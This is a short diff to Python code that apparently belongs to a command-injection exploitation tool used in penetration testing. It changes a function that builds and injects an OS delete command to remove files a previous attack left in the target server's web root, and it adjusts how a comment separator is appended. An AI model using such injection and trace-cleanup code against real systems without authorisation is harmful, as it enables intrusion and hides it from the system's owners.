@@ -79,10 +79,12 @@ def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_metho
 Delete previous shells outputs.
 """
 def delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+  if menu.options.verbose:
+    print "",
   if settings.TARGET_OS == "win":
-    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE + " " + separator + settings.WIN_COMMENT
+    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
   else:  
-    cmd = settings.DEL + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
+    cmd = settings.DEL + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + settings.COMMENT
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
 
 """
